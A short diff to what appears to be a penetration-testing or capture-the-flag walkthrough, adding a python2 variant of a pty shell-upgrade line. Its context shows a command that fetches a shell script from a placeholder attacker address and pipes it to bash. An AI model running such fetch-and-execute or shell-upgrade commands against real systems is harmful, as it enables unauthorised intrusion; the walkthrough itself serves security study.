@@ -41,6 +41,7 @@ curl http://<YOUR_IP>:8000/shell.sh | bash
 Once you get a shell, upgrade it:
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
+python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
 Then:
